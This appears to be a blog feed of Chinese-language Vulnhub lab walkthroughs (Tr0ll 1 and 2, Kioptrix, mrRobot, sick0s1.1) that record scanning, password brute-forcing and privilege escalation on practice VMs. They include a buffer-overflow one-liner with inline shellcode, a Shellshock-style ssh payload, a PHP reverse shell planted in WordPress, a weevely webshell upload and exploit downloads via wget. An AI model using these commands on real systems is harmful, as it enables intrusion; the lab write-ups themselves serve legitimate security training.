alt="请添加图片描述"><code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</code> </p>
<p><code>./dcow -s</code>  <strong>–成功root</strong><br><img src="https://img-blog.csdnimg.cn/0478137e8e8c467a80482ff344e1bce6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>
]]></content>
      <categories>
        <category>Vulnhub系列</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Tr0ll 1</title>
    <url>/2021/12/15/Tr0ll-1/</url>
    <content><![CDATA[<p><strong>靶机：192.168.249.135</strong><br><strong>kali: 192.168.249.132</strong></p>
<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>nmap -sS -sV -A 192.168.249.135</code>  <strong>—查看开放端口及服务探测</strong></p>
<p><img src="/2021/12/15/Tr0ll-1/1.png"></p>
<p><strong>21端口ftp服务</strong>、<strong>80端口</strong></p>
<p><code>nikto -host http://192.168.249.135/</code><strong>—对80端口http服务深入探测(并无可用信息)</strong></p>
<p><strong>访问下21端口ftp服务</strong></p>
<p><img src="/2021/12/15/Tr0ll-1/2.png"></p>
<p><strong>–发现个pcap数据包，用wireshark查看下追踪TCP流–</strong></p>
<p><img src="/2021/12/15/Tr0ll-1/3.png"></p>
<p>发现<strong>用户名/密码=anonymous/password</strong>(貌似假的ssh连不上)<br><strong>-sup3rs3cr3tdirlol-</strong></p>
<p><img src="/2021/12/15/Tr0ll-1/4.png"></p>
<p><strong>·访问发现一个可执行文件·</strong></p>
<p><img src="/2021/12/15/Tr0ll-1/5.png"></p>
<p><strong>·又发现个地址0x0856BF·</strong></p>
<p><img src="/2021/12/15/Tr0ll-1/6.png"></p>
<p><strong>·访问下·</strong></p>
<p><img src="/2021/12/15/Tr0ll-1/8.png"></p>
<p><strong>·两个文件夹都点看看·</strong><br><img src="/2021/12/15/Tr0ll-1/9.png"></p>
<p><strong>告诉我们文件夹就是密码(Pass.txt)</strong><br><img src="/2021/12/15/Tr0ll-1/7.png"><br><img src="/2021/12/15/Tr0ll-1/10.png"></p>
<p>–用户名估计就是txt文件里的其中一个<br>–这貌似考察的<strong>信息泄露</strong>之类的</p>
<p>不断测试发现<strong>用户名/密码</strong>=<strong>overflow</strong>/<strong>Pass.txt</strong>(SSH连接)</p>
<p><img src="/2021/12/15/Tr0ll-1/11.png"></p>
<h4 id="二、0x00权限提升-overlayfs-本地提权"><a href="#二、0x00权限提升-overlayfs-本地提权" class="headerlink" title="二、0x00权限提升(overlayfs 本地提权 )"></a>二、0x00权限提升(overlayfs 本地提权 )</h4><p><code>uname -a</code>  <strong>linux查看内核版本(Linux troll 3.13.0)</strong></p>
<p><code>lsb_release -a</code> <strong>linux查看版本(Ubuntu 14.04)</strong></p>
<p><img src="/2021/12/15/Tr0ll-1/12.png"></p>
<p><code>searchsploit Ubuntu 14.04</code>  <strong>–寻找有无可利用漏洞</strong></p>
<p><img src="/2021/12/15/Tr0ll-1/13.png"></p>
<p><code>python -m SimpleHTTPServer 8000</code><br><code>cd /tmp</code>  <strong>–权限问题cd到tmp目录</strong></p>
<p><code>wget http://192.168.249.132:8000/37292.c</code> <strong>–将exp下载到本地</strong></p>
<p><code>gcc 37292.c -o exp</code> <strong>—编译运行即可</strong><br><code>./exp</code></p>
<p><img src="/2021/12/15/Tr0ll-1/14.png"></p>
<h4 id="二、0x01权限提升-kali-ssh密钥免密登录root"><a href="#二、0x01权限提升-kali-ssh密钥免密登录root" class="headerlink" title="二、0x01权限提升(kali ssh密钥免密登录root)"></a>二、0x01权限提升(kali ssh密钥免密登录root)</h4><p>在第一个方法提权时发现ssh一段时间会自动断开，还会清空下载的文件<br>可能是设置了计划任务。</p>
<p><code>cat /var/log/cronlog</code><strong>–查看相应日志/var/log/cronlog</strong></p>
<p><code>find / -name cleaner.py</code> </p>
<p><img src="/2021/12/15/Tr0ll-1/15.png"></p>
<p><strong>/lib/log/cleaner.py脚本在计划任务中是以root权限执行的，并且该脚本是全局可写的，那么我们就可以利用这一点进行提权</strong></p>
<p><img src="/2021/12/15/Tr0ll-1/16.png"></p>
<p><code>ssh-keygen</code> <strong>–kali生成ssh密钥</strong></p>
<p><img src="/2021/12/15/Tr0ll-1/17.png"><br><img src="/2021/12/15/Tr0ll-1/18.png"></p>
<p><img src="/2021/12/15/Tr0ll-1/19.png"><br><strong>–保存后便应该就可以在kali上免密登录靶机root权限–</strong></p>
<p><strong>我vi不会复制，脚本复制不过去。。。。试了好几次。。。</strong></p>
]]></content>
      <categories>
        <category>Vulnhub系列</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Tr0ll 2</title>
    <url>/2021/12/18/Tr0ll-2/</url>
    <content><![CDATA[<p><strong>靶机：192.168.249.136</strong><br><strong>kali: 192.168.249.132</strong></p>
<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>nmap -sV -sS -A 192.168.249.136</code> <strong>–查看开放端口及服务</strong><br><img src="/2021/12/18/Tr0ll-2/1.png"></p>
<p><strong>–ftp 21端口发现需要用户名和密码—</strong></p>
<p><img src="/2021/12/18/Tr0ll-2/2.png"></p>
<p><img src="/2021/12/18/Tr0ll-2/3.png"></p>
<p><strong>猜测用户名可能是Tr0ll</strong><br><strong>试了试密码也是这个</strong></p>
<p><img src="/2021/12/18/Tr0ll-2/7.png"></p>
<p><strong>有个zip但要密码</strong></p>
<p><code>dirb http://192.168.249.136/</code><strong>–对80端口http服务深入探测–</strong><br><img src="/2021/12/18/Tr0ll-2/4.png"></p>
<p><strong>–robots(.txt)可以正常访问–</strong><br><img src="/2021/12/18/Tr0ll-2/8.png"></p>
<p><strong>–应该是目录，作为字典扫一下—</strong><br><code>dirb http://192.168.249.136/ robots.txt</code><br><img src="/2021/12/18/Tr0ll-2/9.png"></p>
<p><strong>–访问下发现都是这一张图片–</strong><br><img src="/2021/12/18/Tr0ll-2/10.png"></p>
<p><strong>每张图片都cat下</strong></p>
<p><code>http://192.168.249.136/dont_bother/cat_the_troll.jpg</code></p>
<p><strong>这张图片发现</strong><br><img src="/2021/12/18/Tr0ll-2/11.png"></p>
<p>访问目录**/y0ur_self 里面有个txt文件**<br><img src="/2021/12/18/Tr0ll-2/12.png"></p>
<p><strong>像base64加密</strong></p>
<p><code>base64 -d answer.txt &gt; psw.txt</code></p>
<p><strong>psw.txt字典爆破zip</strong></p>
<p><code>fcrackzip -u -D -p psw.txt lmao.zip</code> <strong>fcrackzip爆破</strong><br><img src="/2021/12/18/Tr0ll-2/13.png"></p>
<p>–爆出密码–<br><strong>里面是个rsa私钥，应该可以免密ssh连接</strong><br><img src="/2021/12/18/Tr0ll-2/14.png"></p>
<p><code>ssh -i noob noob@192.168.249.136</code></p>
<p><img src="/2021/12/18/Tr0ll-2/15.png"><br><code>ssh -i noob noob@192.168.8.126 -t &quot;/bin/sh&quot;</code><br><code>ssh -i noob noob@192.168.8.126 -t &quot;bash --noprofile&quot;</code><br><code>ssh -i noob noob@192.168.8.126 -t &quot;() &#123; :; &#125;; /bin/bash&quot;</code><br><img src="/2021/12/18/Tr0ll-2/16.png"></p>
<h4 id="二、提权-缓冲区溢出"><a href="#二、提权-缓冲区溢出" class="headerlink" title="二、提权(缓冲区溢出)"></a>二、提权(缓冲区溢出)</h4><p><code>uname -a</code> <strong>–查看内核(貌似这个靶机的内核漏洞无法提权)</strong><br><img src="/2021/12/18/Tr0ll-2/17.png"><br>–根目录有个<strong>nothing_to_see_here</strong></p>
<p><code>find / -perm -4000 2&gt;/dev/null</code> <strong>–find查看特定用户权限</strong><br><img src="/2021/12/18/Tr0ll-2/18.png"> </p>
<p><strong>这考察的二进制(不擅长)–直接exp</strong><br><code>cd /nothing_to_see_here/choose_wisely/door2</code></p>
<p><strong>exp:</strong><code>./r00t $(python -c &#39;print &quot;A&quot;*268 + &quot;\x80\xfb\xff\xbf&quot; + &quot;\x90&quot;*16 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;&#39;)</code></p>
<p><img src="/2021/12/18/Tr0ll-2/19.png"></p>
<p><strong>—成功root—</strong></p>
]]></content>
      <categories>
        <category>Vulnhub系列</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Kioptix Level 1</title>
    <url>/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/</url>
    <content><![CDATA[<p><em><strong><strong>靶机</strong>: 192.168.249.129<br><strong>kali</strong>: 192.168.249.132</strong></em></p>
<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p> <code>arp-scan -l</code> —<strong>使用网络接口IP地址和网络掩码,生成目标主机地址列表</strong></p>
<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/1.png"></p>
<p>靶机: 192.168.249.129</p>
<p><code>nmap -sV 192.168.249.129</code> —<strong>查看开放端口</strong></p>
<p><strong>信息</strong>:<font color="red"><strong>Apache/1.3.20、mod_ssl/2.8.4、OpenSSL/0.9.6b</strong></font></p>
<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/2.png"></p>
<p><code>nikto -host http://192.168.249.129/</code> —<strong>开放80、443端口,深入探测</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/3.png"></p>
<p>nikto扫到<font color="red"><strong>CVE-2002-0082(Apache Mod_SSL/Apache-SSL远程缓冲区溢出漏洞)</strong></font></p>
<p><font color="red">443端口使用的mod_ssl服务版本为<strong>2.8.4</strong></font></p>
<h4 id="二、0x01漏洞利用-mod-ssl-2-8-4"><a href="#二、0x01漏洞利用-mod-ssl-2-8-4" class="headerlink" title="二、0x01漏洞利用(mod_ssl-2.8.4)"></a>二、0x01漏洞利用(mod_ssl-2.8.4)</h4><p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/4.png"></p>
<p><code>gcc -o exp 47080.c -lcrypto</code> —<strong>编译</strong></p>
<p><code>./exp</code> —-<strong>查看下参数</strong></p>
<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/7.png"></p>
<p><code>./exp | grep apache-1.3.20</code>  —-<strong>找对应的版本</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/5.png"></p>
<p><strong>测试发现攻击偏移量0x6b可以利用</strong><br><code>./exp 0x6b 192.168.249.129 443 -c 40-50</code>  —<strong>root权限</strong></p>
<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/8.png"></p>
<h4 id="三、0x02漏洞利用-Samba-2-2-1a"><a href="#三、0x02漏洞利用-Samba-2-2-1a" class="headerlink" title="三、0x02漏洞利用(Samba 2.2.1a)"></a>三、0x02漏洞利用(Samba 2.2.1a)</h4><p>msf对目标主机进行扫描，得到靶机smb版本为<strong>2.2.1a</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/9.png"></p>
<p><code>searchsploit Samba 2.2</code> —<strong>找下有无可利用的漏洞</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/10.png"></p>
<p><code>searchsploit -p 10.c</code> –<strong>寻找路径</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/11.png"></p>
<p><code>cp /usr/share/exploitdb/exploits/multiple/remote/10.c /root/桌面</code> –<strong>复制到桌面</strong></p>
<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/12.png"></p>
<p><code>gcc -o samba 10.c</code>—<strong>编译运行</strong></p>
<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/13.png"></p>
<p><strong>—–搞定—–</strong></p>
]]></content>
      <categories>
        <category>Vulnhub系列</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>mrRobot</title>
    <url>/2021/12/22/mrRobot/</url>
    <content><![CDATA[<p><strong>靶机：192.168.12.129</strong><br><strong>kali: 192.168.12.128</strong></p>
<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>nmap -sV 192.168.12.129</code> <strong>–扫描开放端口</strong><br><img src="/2021/12/22/mrRobot/1.png"></p>
<p><code>dirsearch -u http://192.168.12.129/</code> <strong>–扫下web目录</strong></p>
<p><strong>–robots.txt和wordpress登录框–</strong><br><img src="/2021/12/22/mrRobot/4.png"><br><img src="/2021/12/22/mrRobot/2.png"><br><strong>得到第一个key</strong><br><img src="/2021/12/22/mrRobot/3.png"><br><strong>fsocity.dic打开是个字典，猜测可以用来爆破wordpress登录框</strong></p>
<p><strong>–bp抓包,fsocity当作字典–</strong><br><img src="/2021/12/22/mrRobot/5.png"></p>
<p><strong>—80多万。。。。。。—</strong></p>
<p><img src="/2021/12/22/mrRobot/7.png"><br><strong>可以确定用户名是Elliot，那用户名不用爆了(长度4204估计回显的是密码错误)</strong></p>
<p><strong>爆破了n年(丢。密码在字典倒数第二个，倒过来就好爆了)</strong></p>
<p>用户名：Elliot 密码：ER28-0652<br><img src="/2021/12/22/mrRobot/8.png"></p>
<p><strong>–登陆–</strong><br><img src="/2021/12/22/mrRobot/9.png"> </p>
<p><code>find / -name php-reverse-shell.php</code> <strong>kali自带的反弹shell</strong><br><code>cd /usr/share/laudanum/php/</code> <strong>—复制php-reverse-shell.php的内容到wp中的404.php</strong></p>
<p><img src="/2021/12/22/mrRobot/15.png"> </p>
<p><strong>修改ip，port为监听机kali的ip与端口</strong><br><img src="/2021/12/22/mrRobot/16.png"> </p>
<p><code>nc -lvp 4444</code> <strong>-监听本地4444端口</strong></p>
<p><img src="/2021/12/22/mrRobot/11.png"> </p>
<p>访问<code>http://192.168.12.129/wp-admin/404.php</code></p>
<p><strong>–成功弹shell–</strong></p>
<p><img src="/2021/12/22/mrRobot/17.png"> </p>
<p><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code> <strong>–优化终端</strong></p>
<p><img src="/2021/12/22/mrRobot/18.png"> </p>
<h4 id="二、提权-SUID提权"><a href="#二、提权-SUID提权" class="headerlink" title="二、提权(SUID提权)"></a>二、提权(SUID提权)</h4><p><code>cd</code><strong>home文件夹存在robot用户，并且在其中发现登录密码</strong><br><img src="/2021/12/22/mrRobot/14.png"> </p>
<p><strong>robot密码：abcdefghijklmnopqrstuvwxyz</strong><br><img src="/2021/12/22/mrRobot/13.png"> </p>
<p><code>su - robot</code>  <strong>–登陆robot用户</strong></p>
<p><img src="/2021/12/22/mrRobot/19.png"> </p>
<p><a href="https://www.cnblogs.com/junsec/p/11652723.html" title="find / -perm -u=s -type f 2&gt;/dev/null">Linux suid 提权</a></p>
<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code> <strong>—查找suid文件</strong></p>
<p><img src="/2021/12/22/mrRobot/20.png"> </p>
<p><code>ls -l /usr/local/bin/nmap</code> <strong>–查看下nmap的权限是root权限</strong><br><img src="/2021/12/22/mrRobot/21.png"> </p>
<p><code>nmap --interactive</code> <strong>–交互</strong></p>
<p><code>!sh</code>  <strong>—成功root</strong></p>
<p><img src="/2021/12/22/mrRobot/22.png"> </p>
]]></content>
      <categories>
        <category>Vulnhub系列</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>sick0s1.1</title>
    <url>/2021/12/23/sick0s1-1/</url>
    <content><![CDATA[<p><strong>靶机：192.168.12.130</strong><br><strong>kali: 192.168.249.128</strong></p>
<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>nmap -sV 192.168.12.130</code> <strong>–扫描开放端口</strong><br><img src="/2021/12/23/sick0s1-1/1.png"></p>
<p><strong>3128端口是作为代理</strong><br><img src="/2021/12/23/sick0s1-1/2.png"></p>
<p> <code>dirsearch -u http://192.168.12.130 --proxy=192.168.12.130:3128</code> <strong>–扫下web目录</strong></p>
<p><img src="/2021/12/23/sick0s1-1/3.png"></p>
<p><strong>扫到robots.txt</strong></p>
<p><img src="/2021/12/23/sick0s1-1/4.png"></p>
<p><font color="red"><strong>Wolf CMS</strong></font></p>
<p><img src="/2021/12/23/sick0s1-1/5.png"></p>
<p><strong>后台管理:?/admin</strong></p>
<p><img src="/2021/12/23/sick0s1-1/6.png"></p>
<p><strong>一试就出来了–admin/admin</strong></p>
<p><a href="https://cloud.tencent.com/developer/article/1047292" title="Wolfcms 0.8.2中存在任意文件上传漏洞">Wolfcms 0.8.2中存在任意文件上传漏洞</a></p>
<p><font color="red"><strong>weevely</strong></font>是适用于php网站的webshell工具,使用weevely生成的木马免杀能力较强，而且使用加密连接，往往能轻松突破WAF拦截。(<strong>又学到一个工具</strong>)</p>
<p><code>weevely generate 666 yasso.php</code> <strong>–密码666</strong><br><img src="/2021/12/23/sick0s1-1/7.png"></p>
<p><strong>–上传–</strong></p>
<p><img src="/2021/12/23/sick0s1-1/11.png"></p>
<p><img src="/2021/12/23/sick0s1-1/8.png"></p>
<p><strong>weevely连接木马(需要开启代理)</strong></p>
<p><code>export http_proxy=http://192.168.12.130:3128</code> <strong>–配置代理</strong></p>
<p><img src="/2021/12/23/sick0s1-1/9.png"></p>
<p><img src="/2021/12/23/sick0s1-1/10.png"></p>
<p><strong>打完靶机切记删除代理!!!</strong></p>
<p><code>unset http_proxy</code> <strong>–删除代理</strong></p>
<p><code>weevely http://192.168.12.130/wolfcms/public/yasso.php 666</code> <strong>–连接木马</strong><br><img src="/2021/12/23/sick0s1-1/12.png"></p>
<h4 id="二、提权"><a href="#二、提权" class="headerlink" title="二、提权"></a>二、提权</h4><p><code>cd /var/www/wolfcms</code><strong>–/var/www/wolfcms目录下面发现数据库配置文件</strong><br><img src="/2021/12/23/sick0s1-1/13.png"></p>
<p><strong>发现用户名/密码=root/john@123</strong><br><img src="/2021/12/23/sick0s1-1/14.png"></p>
<p><strong>貌似只允许本地连接</strong><br><img src="/2021/12/23/sick0s1-1/15.png"></p>
<p><code>cat /etc/passwd | grep /bin/bash</code>  <strong>–查看当前用户</strong><br><img src="/2021/12/23/sick0s1-1/16.png"></p>
<p><strong>发现sickos用户</strong></p>
<p><strong>root数据库密码即sickos密码</strong></p>
<p><code>ssh sickos@192.168.12.130</code> <strong>ssh连接</strong></p>
<p><code>sudo su</code> <strong>–输入sickos密码</strong></p>
<p><img src="/2021/12/23/sick0s1-1/17.png"></p>
<p><strong>成功root</strong></p>
]]></content>
      <categories>
        <category>Vulnhub系列</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
</search>
